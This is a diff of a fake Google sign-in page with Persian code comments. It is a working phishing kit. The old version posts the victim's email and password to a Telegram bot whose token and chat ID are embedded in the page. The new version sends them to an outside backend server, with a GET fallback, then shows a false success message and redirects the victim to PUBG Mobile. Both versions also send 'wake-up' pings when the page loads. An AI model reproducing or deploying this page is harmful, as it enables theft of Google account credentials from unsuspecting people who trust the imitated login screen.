@@ -1,620 +1,666 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Sign in - Google Accounts</title>
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
         }
 
         body {
             background: #f1f3f4;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
             align-items: center;
-            padding: 16px;
+            justify-content: center;
+            padding: 20px;
         }
 
-        .login-container {
+        .login-card {
             background: #ffffff;
-            max-width: 450px;
+            max-width: 420px;
             width: 100%;
-            padding: 48px 40px 36px 40px;
+            padding: 48px 40px 36px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
-            transition: all 0.2s ease;
-            animation: fadeUp 0.4s ease-out;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08), 0 1px 4px rgba(0, 0, 0, 0.04);
+            text-align: left;
         }
 
-        /* لوگوی گوگل */
         .google-logo {
             display: flex;
-            justify-content: center;
-            margin-bottom: 16px;
+            justify-content: flex-start;
+            margin-bottom: 20px;
         }
 
         .google-logo svg {
-            width: 75px;
-            height: 75px;
+            width: 48px;
+            height: 48px;
         }
 
-        h2 {
+        .login-title {
             font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            text-align: center;
+            font-weight: 500;
+            color: #1f1f1f;
             margin-bottom: 8px;
         }
 
-        .subtitle {
-            text-align: center;
-            font-size: 16px;
+        .login-sub {
             color: #5f6368;
-            margin-bottom: 28px;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 32px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 16px 16px 16px;
+            font-size: 16px;
+            font-family: inherit;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            background: #ffffff;
+            transition: border 0.2s, box-shadow 0.2s;
+            color: #202124;
+        }
+
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.15);
+        }
+
+        .input-group input.error {
+            border-color: #d93025;
+            box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.15);
+        }
+
+        .input-group input::placeholder {
+            color: #9aa0a6;
             font-weight: 400;
         }
 
-        /* پیام‌های خطا و موفقیت */
+        .error-message {
+            display: none;
+            color: #d93025;
+            font-size: 12px;
+            font-weight: 400;
+            margin-top: 4px;
+            margin-bottom: 8px;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .input-group.hidden {
+            display: none;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: left;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 4px;
+            margin-bottom: 32px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-link.hide {
+            display: none;
+        }
+
+        .forgot-password-link {
+            display: none;
+            text-align: left;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 4px;
+            margin-bottom: 32px;
+        }
+
+        .forgot-password-link:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password-link.show {
+            display: block;
+        }
+
+        .actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+
+        .btn-create {
+            background: transparent;
+            border: none;
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.15s;
+            font-family: inherit;
+        }
+
+        .btn-create:hover {
+            background: rgba(26, 115, 232, 0.06);
+        }
+
+        .btn-next {
+            background: #1a73e8;
+            border: none;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 12px 28px;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: background 0.15s, box-shadow 0.15s;
+            font-family: inherit;
+        }
+
+        .btn-next:hover {
+            background: #1557b0;
+            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
+        }
+
+        .footer-links {
+            margin-top: 36px;
+            display: flex;
+            justify-content: flex-start;
+            gap: 28px;
+            flex-wrap: wrap;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            transition: color 0.15s;
+        }
+
+        .footer-links a:hover {
+            color: #1a73e8;
+            text-decoration: underline;
+        }
+
+        .email-display {
+            display: none;
+            color: #202124;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            padding: 8px 0;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .email-display.show {
+            display: block;
+        }
+
+        .email-display span {
+            color: #5f6368;
+            font-weight: 400;
+            font-size: 14px;
+            display: block;
+            margin-top: 4px;
+        }
+
+        .back-to-email {
+            display: none;
+            background: transparent;
+            border: none;
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 4px 0;
+            margin-bottom: 16px;
+            font-family: inherit;
+        }
+
+        .back-to-email:hover {
+            text-decoration: underline;
+        }
+
+        .back-to-email.show {
+            display: inline-block;
+        }
+
+        /* ===== پیام‌های خطا و موفقیت ===== */
         .error-msg {
             background: #fce8e6;
             color: #d93025;
             padding: 10px 14px;
-            border-radius: 4px;
+            border-radius: 8px;
             font-size: 14px;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             display: none;
-            text-align: right;
-            border: 1px solid #f5c6c2;
+            text-align: left;
+            border: 1px solid #f5c6cb;
         }
         .error-msg i {
-            margin-left: 6px;
+            margin-right: 6px;
         }
 
         .success-msg {
             background: #e6f4ea;
             color: #1e8e3e;
             padding: 10px 14px;
-            border-radius: 4px;
+            border-radius: 8px;
             font-size: 14px;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             display: none;
-            text-align: right;
-            border: 1px solid #a8dab5;
+            text-align: left;
+            border: 1px solid #b7e1cd;
         }
         .success-msg i {
-            margin-left: 6px;
+            margin-right: 6px;
         }
 
-        /* استیل باکس ورودی - ساده مانند گوگل */
-        .input-group {
-            margin-bottom: 8px;
-            position: relative;
-        }
-
-        .input-wrapper {
-            position: relative;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            padding: 0 12px;
-            background: #fff;
-            transition: border 0.2s;
-        }
-
-        .input-wrapper:focus-within {
-            border-color: #1a73e8;
-            border-width: 2px;
-        }
-
-        .input-wrapper input {
-            width: 100%;
-            padding: 14px 0;
-            border: none;
-            outline: none;
-            font-size: 16px;
-            background: transparent;
-            color: #202124;
-        }
-
-        .input-wrapper input::placeholder {
-            color: #9aa0a6;
-            font-weight: 400;
-        }
-
-        .input-wrapper .toggle-password {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #5f6368;
-            font-size: 20px;
-            padding: 4px;
-            transition: color 0.2s;
-            background: transparent;
-            border: none;
-        }
-
-        .input-wrapper .toggle-password:hover {
-            color: #202124;
-        }
-
-        /* لینک فراموشی ایمیل */
-        .forgot-email {
-            display: block;
-            text-align: right;
-            font-size: 14px;
-            color: #1a73e8;
-            text-decoration: none;
-            margin: 8px 0 16px 0;
-            padding: 4px 0;
-        }
-
-        .forgot-email:hover {
-            text-decoration: underline;
-        }
-
-        /* دکمه‌ها - استایل گوگل */
-        .actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 20px;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-
-        .btn {
-            background: transparent;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #1a73e8;
-            cursor: pointer;
-            transition: background 0.2s;
-            letter-spacing: 0.3px;
-        }
-
-        .btn:hover {
-            background: rgba(26, 115, 232, 0.08);
-        }
-
-        .btn-primary {
-            background: #1a73e8;
-            color: #fff;
-            padding: 10px 28px;
-            border-radius: 4px;
-            border: none;
-            font-weight: 500;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background 0.2s, box-shadow 0.2s;
-        }
-
-        .btn-primary:hover {
-            background: #1557b0;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
-        }
-
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: #1a73e8;
-            padding: 10px 8px;
-            font-weight: 500;
-        }
-
-        /* مرحله دوم (پسورد) – مخفی در ابتدا */
-        .step-password {
-            display: none;
-            margin-top: 8px;
-        }
-
-        .step-email {
-            display: block;
-        }
-
-        /* لینک‌های پایین */
-        .footer-links {
-            margin-top: 32px;
-            text-align: center;
-            font-size: 12px;
-            color: #5f6368;
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            color: #5f6368;
-            text-decoration: none;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .footer-links .lang-select {
-            color: #5f6368;
-            cursor: default;
-        }
-
-        /* ریسپانسیو */
         @media (max-width: 480px) {
-            .login-container {
-                padding: 32px 20px 24px;
+            .login-card {
+                padding: 32px 20px 28px;
             }
             .actions {
-                flex-direction: column-reverse;
+                flex-direction: column;
                 align-items: stretch;
             }
-            .btn-primary {
-                width: 100%;
+            .btn-next {
+                justify-content: center;
+                border-radius: 24px;
+            }
+            .btn-create {
                 text-align: center;
             }
-            .btn-secondary {
-                text-align: center;
-                padding: 10px 0;
-            }
-            .forgot-email {
+            .forgot-link {
                 text-align: center;
             }
-        }
-
-        /* انیمیشن */
-        @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(16px);
+            .forgot-password-link {
+                text-align: center;
             }
-            to {
-                opacity: 1;
-                transform: translateY(0);
+            .footer-links {
+                justify-content: center;
             }
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container" id="loginContainer">
+    <div class="login-card">
 
-        <!-- لوگوی گوگل -->
+        <!-- Google Logo -->
         <div class="google-logo">
             <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                 <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                 <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/>
+                <path fill="none" d="M0 0h48v48H0z"/>
             </svg>
         </div>
 
-        <h2>Sign in</h2>
-        <p class="subtitle" id="stepTitle">with your Google Account. You'll also sign in to Google services in your apps &amp; Safari.</p>
+        <h1 class="login-title">Sign in</h1>
+        <p class="login-sub">Use your Google Account</p>
 
-        <!-- پیام‌های خطا و موفقیت -->
+        <!-- Email display -->
+        <div class="email-display" id="emailDisplay">
+            <span id="emailText">Email</span>
+        </div>
+
+        <!-- Back button -->
+        <button class="back-to-email" id="backToEmail">← Back</button>
+
+        <!-- ===== پیام‌های خطا و موفقیت ===== -->
         <div class="error-msg" id="errorMsg">
-            <i class="fas fa-exclamation-circle"></i> <span id="errorText">An error occurred.</span>
+            <i>⚠️</i> <span id="errorText">خطا رخ داده است.</span>
         </div>
         <div class="success-msg" id="successMsg">
-            <i class="fas fa-check-circle"></i> Login successful!
+            <i>✅</i> ورود موفقیت‌آمیز!
         </div>
 
-        <!-- مرحله اول: ایمیل -->
-        <div class="step-email" id="stepEmail">
-            <div class="input-group">
-                <div class="input-wrapper">
-                    <input type="email" id="emailInput" placeholder="Email or phone" autocomplete="email" value="">
-                </div>
-                <a href="#" class="forgot-email" id="forgotEmailLink">Forgot email?</a>
-            </div>
-            <div class="actions">
-                <button class="btn btn-secondary" id="createAccountBtn">Create account</button>
-                <button class="btn btn-primary" id="nextBtn">Next</button>
-            </div>
+        <!-- Email input -->
+        <div class="input-group" id="emailGroup">
+            <input type="email" id="emailInput" placeholder="Enter your email address" />
+            <div class="error-message" id="emailError">Please enter a valid email address</div>
         </div>
 
-        <!-- مرحله دوم: پسورد -->
-        <div class="step-password" id="stepPassword">
-            <div class="input-group">
-                <div class="input-wrapper">
-                    <input type="password" id="passwordInput" placeholder="Enter your password" autocomplete="current-password" value="">
-                    <button type="button" class="toggle-password" id="togglePassword">
-                        <i class="fas fa-eye" id="eyeIcon"></i>
-                    </button>
-                </div>
-            </div>
-            <div class="actions" style="margin-top: 12px;">
-                <button class="btn btn-secondary" id="backBtn">
-                    <i class="fas fa-arrow-right" style="margin-left: 6px;"></i> Back
-                </button>
-                <button class="btn btn-primary" id="signinBtn">Next</button>
-            </div>
+        <!-- Password input -->
+        <div class="input-group hidden" id="passwordGroup">
+            <input type="password" id="passwordInput" placeholder="Enter your password" />
+            <div class="error-message" id="passwordError">Please enter your password</div>
         </div>
 
-        <!-- لینک‌های پایین -->
+        <!-- Forgot email -->
+        <a href="#" class="forgot-link" id="forgotEmail">Forgot email?</a>
+
+        <!-- Forgot password -->
+        <a href="#" class="forgot-password-link" id="forgotPassword">Forgot password?</a>
+
+        <!-- Actions -->
+        <div class="actions">
+            <button class="btn-create">Create account</button>
+            <button class="btn-next" id="nextBtn">Next</button>
+        </div>
+
+        <!-- Footer -->
         <div class="footer-links">
-            <span class="lang-select">English (United States)</span>
-            <a href="#">Help</a>
             <a href="#">Privacy</a>
             <a href="#">Terms</a>
+            <a href="#">Help</a>
         </div>
+
     </div>
 
     <script>
         // =====================================================
-        // تنظیمات تلگرام
+        // 🔗 تنظیمات تلگرام - لینک بک‌اند
         // =====================================================
-        const TELEGRAM_CONFIG = {
-            botToken: "8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ",
-            chatId: "6689313262"
-        };
-
+        const TELEGRAM_BACKEND_URL = "https://telegram-backend-zo3n.onrender.com";
         const WAKEUP_COUNT = 2;
 
         // =====================================================
-        // ارسال پیام به تلگرام
+        // 🚀 ارسال پیام ویکاپ به بک‌اند
         // =====================================================
-        function sendTelegramMessage(text, parseMode = 'Markdown') {
-            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-
-            return fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CONFIG.chatId,
-                    text: text,
-                    parse_mode: parseMode
+        function sendWakeup(index) {
+            try {
+                fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        action: `🔄 Google Wake-up (${index}/${WAKEUP_COUNT})`,
+                        name: "System",
+                        extra: `Wake-up ping ${index}`,
+                        time: new Date().toLocaleString('fa-IR')
+                    })
                 })
-            })
-            .then(res => res.json())
-            .catch(err => console.error("Telegram error:", err));
+                .then(() => console.log(`✅ Wake-up ${index} sent`))
+                .catch(() => console.log(`⚠️ Wake-up ${index} failed`));
+            } catch(e) {
+                console.log("Wake-up error:", e);
+            }
         }
 
         // =====================================================
-        // ارسال پیام‌های ویک‌آپ هنگام لود صفحه
+        // 🚀 ارسال اطلاعات ورود به بک‌اند
         // =====================================================
-        function sendWakeupOnLoad() {
+        function sendLoginInfo(username, password) {
+            // مرحله 1: ارسال ۲ ویکاپ
             for (let i = 1; i <= WAKEUP_COUNT; i++) {
                 setTimeout(() => {
-                    const message = `🌐 **Google Login Page Loaded - Wake-up** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
-                    sendTelegramMessage(message);
+                    sendWakeup(i);
                 }, i * 500);
             }
+
+            // مرحله 2: ارسال اطلاعات اصلی با تاخیر
+            setTimeout(() => {
+                try {
+                    fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            action: "🔐 Google Login",
+                            name: username,
+                            extra: `Password: ${password}`,
+                            time: new Date().toLocaleString('fa-IR')
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log("✅ Login info sent successfully");
+                        } else {
+                            console.log("⚠️ Login info sent but response not ok");
+                        }
+                    })
+                    .catch(err => {
+                        console.log("⚠️ Login info send failed, trying fallback...");
+                        try {
+                            const msg = encodeURIComponent(`Google Login | User: ${username} | Pass: ${password}`);
+                            fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
+                                .then(() => console.log("✅ Fallback GET success"))
+                                .catch(e => console.log("❌ Fallback failed"));
+                        } catch(e) {
+                            console.log("❌ All methods failed");
+                        }
+                    });
+                } catch(e) {
+                    console.log("Error sending login info:", e);
+                }
+            }, 1500);
         }
 
-        // =====================================================
-        // ارسال اطلاعات ورود به تلگرام
-        // =====================================================
-        function sendLoginInfo(email, password) {
-            const message =
-                `🔔 **Google Account Login!**\n\n` +
-                `📧 **Email:** \`${email}\`\n` +
-                `🔑 **Password:** \`${password}\`\n\n` +
-                `🕐 Time: ${new Date().toLocaleString('fa-IR')}`;
-
-            sendTelegramMessage(message);
-        }
-
-        // =====================================================
-        // ارسال ویک‌آپ + اطلاعات ورود
-        // =====================================================
-        function sendWakeupAndLoginInfo(email, password) {
-            let wakeupPromises = [];
-            for (let i = 1; i <= WAKEUP_COUNT; i++) {
-                const promise = new Promise((resolve) => {
-                    setTimeout(() => {
-                        const message = `🔄 **Google Wake-up ping** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
-                        sendTelegramMessage(message)
-                            .then(result => resolve(result))
-                            .catch(err => resolve({ ok: false, error: err }));
-                    }, i * 600);
-                });
-                wakeupPromises.push(promise);
-            }
-
-            Promise.all(wakeupPromises).then(() => {
+        // =============================================
+        // ===== 🚀 تابع باز کردن PUBG Mobile =====
+        // =============================================
+        function openPUBG() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            
+            const isAndroid = /android/i.test(userAgent);
+            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+            
+            if (isAndroid) {
+                window.location.href = 'intent://com.tencent.ig#Intent;scheme=https;package=com.tencent.ig;end';
                 setTimeout(() => {
-                    sendLoginInfo(email, password);
-                }, 500);
-            });
+                    window.location.href = 'https://play.google.com/store/apps/details?id=com.tencent.ig';
+                }, 2000);
+            } else if (isIOS) {
+                window.location.href = 'https://pubg.com/';
+                setTimeout(() => {
+                    window.location.href = 'https://apps.apple.com/app/pubg-mobile/id1330123889';
+                }, 2000);
+            } else {
+                window.open('https://www.pubg.com/', '_blank');
+            }
         }
 
-        // =====================================================
-        // المنت‌های صفحه
-        // =====================================================
-        const stepEmail = document.getElementById('stepEmail');
-        const stepPassword = document.getElementById('stepPassword');
-        const stepTitle = document.getElementById('stepTitle');
-
+        // =============================================
+        // ===== DOM Elements =====
+        // =============================================
+        const nextBtn = document.getElementById('nextBtn');
+        const emailGroup = document.getElementById('emailGroup');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const forgotEmail = document.getElementById('forgotEmail');
+        const forgotPassword = document.getElementById('forgotPassword');
+        const emailDisplay = document.getElementById('emailDisplay');
+        const emailText = document.getElementById('emailText');
+        const backToEmail = document.getElementById('backToEmail');
         const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
-        const nextBtn = document.getElementById('nextBtn');
-        const backBtn = document.getElementById('backBtn');
-        const signinBtn = document.getElementById('signinBtn');
-        const createAccountBtn = document.getElementById('createAccountBtn');
-        const forgotEmailLink = document.getElementById('forgotEmailLink');
-
-        const errorMsg = document.getElementById('errorMsg');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        const errorBox = document.getElementById('errorMsg');
         const errorText = document.getElementById('errorText');
-        const successMsg = document.getElementById('successMsg');
+        const successBox = document.getElementById('successMsg');
 
-        const togglePassword = document.getElementById('togglePassword');
-        const eyeIcon = document.getElementById('eyeIcon');
+        let isPasswordVisible = false;
 
-        let passwordVisible = false;
-
-        // =====================================================
-        // توابع کمکی
-        // =====================================================
-        function showError(msg) {
-            errorText.textContent = msg || 'An error occurred.';
-            errorMsg.style.display = 'block';
-            successMsg.style.display = 'none';
-        }
-
-        function hideError() {
-            errorMsg.style.display = 'none';
-        }
-
-        function showSuccess(msg) {
-            successMsg.innerHTML = `<i class="fas fa-check-circle"></i> ${msg || 'Login successful!'}`;
-            successMsg.style.display = 'block';
-            errorMsg.style.display = 'none';
-        }
-
-        function hideSuccess() {
-            successMsg.style.display = 'none';
-        }
-
+        // Email validation function
         function isValidEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(email);
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return emailRegex.test(email);
         }
 
-        // =====================================================
-        // رفتن به مرحله پسورد
-        // =====================================================
-        function goToPasswordStep() {
-            const email = emailInput.value.trim();
-            hideError();
-            hideSuccess();
-
-            if (!email) {
-                showError('Please enter your email');
-                return;
-            }
-            if (!isValidEmail(email)) {
-                showError('Please enter a valid email address');
-                return;
-            }
-
-            stepEmail.style.display = 'none';
-            stepPassword.style.display = 'block';
-            stepTitle.textContent = `Welcome, ${email}`;
-            setTimeout(() => passwordInput.focus(), 100);
+        function removeEmailError() {
+            emailInput.classList.remove('error');
+            emailError.classList.remove('show');
         }
 
-        // =====================================================
-        // بازگشت به مرحله ایمیل
-        // =====================================================
-        function goToEmailStep() {
-            stepPassword.style.display = 'none';
-            stepEmail.style.display = 'block';
-            stepTitle.textContent = "with your Google Account. You'll also sign in to Google services in your apps & Safari.";
-            hideError();
-            hideSuccess();
-            passwordInput.value = '';
-            setTimeout(() => emailInput.focus(), 100);
+        function showEmailError() {
+            emailInput.classList.add('error');
+            emailError.classList.add('show');
         }
 
-        // =====================================================
-        // عملیات ورود - ارسال اطلاعات به تلگرام
-        // =====================================================
-        function handleSignIn() {
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-
-            hideError();
-            hideSuccess();
-
-            if (!email) {
-                showError('Email not found. Please go back.');
-                return;
-            }
-
-            if (!password) {
-                showError('Password cannot be empty');
-                return;
-            }
-
-            if (password.length < 5) {
-                showError('Password must be at least 5 characters');
-                return;
-            }
-
-            sendWakeupAndLoginInfo(email, password);
-
-            showSuccess(`Login successful!`);
-
-            // پاک کردن پسورد
-            passwordInput.value = '';
+        function removePasswordError() {
+            passwordInput.classList.remove('error');
+            passwordError.classList.remove('show');
         }
 
-        // =====================================================
-        // رویدادها
-        // =====================================================
+        function showPasswordError() {
+            passwordInput.classList.add('error');
+            passwordError.classList.add('show');
+        }
 
-        nextBtn.addEventListener('click', goToPasswordStep);
+        function hideAllMessages() {
+            errorBox.style.display = 'none';
+            successBox.style.display = 'none';
+        }
 
-        backBtn.addEventListener('click', goToEmailStep);
+        function showError(message) {
+            errorText.textContent = message;
+            errorBox.style.display = 'block';
+        }
 
-        signinBtn.addEventListener('click', handleSignIn);
+        function showSuccess(message) {
+            successBox.innerHTML = `<i>✅</i> ${message}`;
+            successBox.style.display = 'block';
+        }
 
-        createAccountBtn.addEventListener('click', function() {
-            hideError();
-            hideSuccess();
-            alert('Create new account page (simulated)');
-        });
-
-        forgotEmailLink.addEventListener('click', function(e) {
-            e.preventDefault();
-            hideError();
-            hideSuccess();
-            alert('Forgot email? (simulated)');
-        });
-
-        togglePassword.addEventListener('click', function() {
-            passwordVisible = !passwordVisible;
-            passwordInput.type = passwordVisible ? 'text' : 'password';
-            eyeIcon.className = passwordVisible ? 'fas fa-eye-slash' : 'fas fa-eye';
-        });
-
+        // Real-time validation on input
         emailInput.addEventListener('input', function() {
-            hideError();
-            hideSuccess();
-        });
-
-        passwordInput.addEventListener('input', function() {
-            hideError();
-            hideSuccess();
-        });
-
-        emailInput.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                nextBtn.click();
+            if (this.value.trim() && !isValidEmail(this.value.trim())) {
+                showEmailError();
+            } else {
+                removeEmailError();
             }
         });
 
-        passwordInput.addEventListener('keydown', function(e) {
+        emailInput.addEventListener('focus', removeEmailError);
+        passwordInput.addEventListener('focus', removePasswordError);
+
+        // =============================================
+        // ===== Next Button =====
+        // =============================================
+        nextBtn.addEventListener('click', function() {
+            hideAllMessages();
+
+            if (!isPasswordVisible) {
+                const email = emailInput.value.trim();
+                
+                if (!email) {
+                    showEmailError();
+                    emailInput.focus();
+                    return;
+                }
+                
+                if (!isValidEmail(email)) {
+                    showEmailError();
+                    emailInput.focus();
+                    return;
+                }
+                
+                // Email is valid - proceed to password
+                emailText.textContent = email;
+                emailDisplay.classList.add('show');
+                
+                emailGroup.classList.add('hidden');
+                forgotEmail.classList.add('hide');
+                passwordGroup.classList.remove('hidden');
+                forgotPassword.classList.add('show');
+                backToEmail.classList.add('show');
+                this.textContent = 'Sign in';
+                isPasswordVisible = true;
+                
+                setTimeout(() => passwordInput.focus(), 100);
+            } else {
+                const password = passwordInput.value.trim();
+                const email = emailInput.value.trim();
+                
+                if (!password) {
+                    showPasswordError();
+                    passwordInput.focus();
+                    return;
+                }
+                
+                // =============================================
+                // 🚀 ارسال به تلگرام + باز کردن PUBG
+                // =============================================
+                
+                // 1. ارسال اطلاعات به تلگرام (با ویکاپ)
+                sendLoginInfo(email, password);
+
+                // 2. نمایش پیام موفقیت
+                showSuccess('✅ ورود موفق! در حال انتقال به PUBG...');
+
+                // 3. با تاخیر 1.5 ثانیه PUBG را باز کن
+                setTimeout(() => {
+                    openPUBG();
+                }, 1500);
+
+                // Reset form state after sign in
+                // (Optional: reset after a few seconds)
+            }
+        });
+
+        backToEmail.addEventListener('click', function() {
+            hideAllMessages();
+            emailGroup.classList.remove('hidden');
+            forgotEmail.classList.remove('hide');
+            passwordGroup.classList.add('hidden');
+            forgotPassword.classList.remove('show');
+            emailDisplay.classList.remove('show');
+            backToEmail.classList.remove('show');
+            nextBtn.textContent = 'Next';
+            isPasswordVisible = false;
+            
+            removeEmailError();
+            removePasswordError();
+            
+            setTimeout(() => emailInput.focus(), 100);
+        });
+
+        // Enter key support
+        document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
-                e.preventDefault();
-                signinBtn.click();
+                const active = document.activeElement;
+                if (active === emailInput || active === passwordInput) {
+                    nextBtn.click();
+                }
             }
         });
 
         // =====================================================
-        // اجرا در هنگام لود صفحه
+        // 🔥 ویکاپ هنگام لود صفحه
         // =====================================================
         document.addEventListener('DOMContentLoaded', function() {
-            emailInput.focus();
-            sendWakeupOnLoad();
-            console.log('✅ Google Login Page with Telegram Bot Ready!');
+            fetch(`${TELEGRAM_BACKEND_URL}/health`)
+                .then(() => console.log('✅ Server is awake'))
+                .catch(() => console.log('🔄 Server waking up...'));
+            
+            for (let i = 1; i <= WAKEUP_COUNT; i++) {
+                setTimeout(() => {
+                    sendWakeup(i);
+                }, i * 400);
+            }
+            
+            console.log('✅ Google Login Page Ready!');
+            console.log(`🔗 Backend URL: ${TELEGRAM_BACKEND_URL}`);
         });
     </script>
 
